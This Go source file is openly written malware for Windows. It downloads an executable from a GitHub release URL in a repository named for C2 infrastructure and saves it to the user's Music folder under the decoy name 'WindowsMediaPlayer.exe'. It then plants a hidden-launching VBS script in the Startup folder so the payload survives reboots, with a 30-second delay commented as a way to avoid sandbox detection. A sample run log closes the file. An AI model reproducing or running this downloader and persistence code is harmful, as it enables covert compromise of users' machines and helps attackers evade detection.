package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
)

// Function to create startup persistence (stealthy VBS method)
func addToStartup(name, exePath string) error {
	// Get current user's startup folder (no admin needed)
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Create a VBS script that launches the executable
	vbsContent := fmt.Sprintf(`Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep 30000  ' Delay 30 seconds to avoid sandbox detection
WshShell.Run "%s", 0, False
Set WshShell = Nothing`, exePath)

	// Save as VBS file with legitimate name
	vbsFile := filepath.Join(startupPath, name+".vbs")

	return os.WriteFile(vbsFile, []byte(vbsContent), 0644)
}

// Check if our persistence exists
func checkStartup(name, expectedPath string) bool {
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	vbsFile := filepath.Join(startupPath, name+".vbs")

	// Check if VBS file exists
	if _, err := os.Stat(vbsFile); err != nil {
		return false
	}

	// Optional: Read and verify content
	content, err := os.ReadFile(vbsFile)
	if err != nil {
		return false
	}

	// Simple check - just verify file exists (optional)
	return len(content) > 0
}

// Download file from URL (your existing function)
func downloadFile(filepath string, url string) error {
	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

// Check if file exists
func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// Survive reboots using stealthy method
func makePersistent() {
	// Use a legitimate-looking payload name
	payloadName := "WindowsMediaPlayer"

	// Get the Music directory instead of temp
	musicDir := filepath.Join(os.Getenv("USERPROFILE"), "Music")
	location := filepath.Join(musicDir, payloadName+".exe")

	// Check if our payload exists in Music folder
	if !fileExists(location) {
		fmt.Printf("File '%s' does not exist\n", location)
		fmt.Println("Downloading payload to Music folder...")

		// Download the payload (YOUR ORIGINAL URL)
		err := downloadFile(location, "https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/Windows_Security.exe")
		if err != nil {
			log.Printf("Download failed: %v\n", err)
			return
		}
		fmt.Println("Download completed to Music folder")
	}

	fmt.Printf("Payload exists: %s\n", location)

	// Check if persistence already exists
	if !checkStartup(payloadName, location) {
		// Add to startup using stealthy VBS method
		if err := addToStartup(payloadName, location); err != nil {
			log.Printf("Error adding to startup: %v\n", err)
			return
		}
		fmt.Printf("[*] Added stealth startup persistence: %s.vbs\n", payloadName)
	} else {
		fmt.Println("[*] Persistence already exists")
	}

	fmt.Printf("Malware survives reboots. Startup file: %s.vbs\n", payloadName)
	fmt.Printf("Payload location (Music folder): %s\n", location)
}

func main() {
	fmt.Println("[+] Setting up persistence...")
	makePersistent()
	fmt.Println("[+] Persistence setup complete")

	// Test verification
	payloadName := "WindowsMediaPlayer"
	musicDir := filepath.Join(os.Getenv("USERPROFILE"), "Music")
	expectedPath := filepath.Join(musicDir, payloadName+".exe")

	if checkStartup(payloadName, expectedPath) {
		fmt.Println("[✓] Startup persistence verified")
	} else {
		fmt.Println("[?] Manual verification needed")
	}

	// Keep console open (for testing)
	fmt.Println("\nPress Enter to exit...")
	fmt.Scanln()
}

/*
	cmd>> go run main.go
[+] Setting up persistence...
File 'C:\Users\user\Music\WindowsMediaPlayer.exe' does not exist
Downloading payload to Music folder...
Download completed to Music folder
Payload exists: C:\Users\user\Music\WindowsMediaPlayer.exe
[*] Added stealth startup persistence: WindowsMediaPlayer.vbs
Malware survives reboots. Startup file: WindowsMediaPlayer.vbs
Payload location (Music folder): C:\Users\user\Music\WindowsMediaPlayer.exe
[+] Persistence setup complete
[✓] Startup persistence verified

Press Enter to exit...


*/
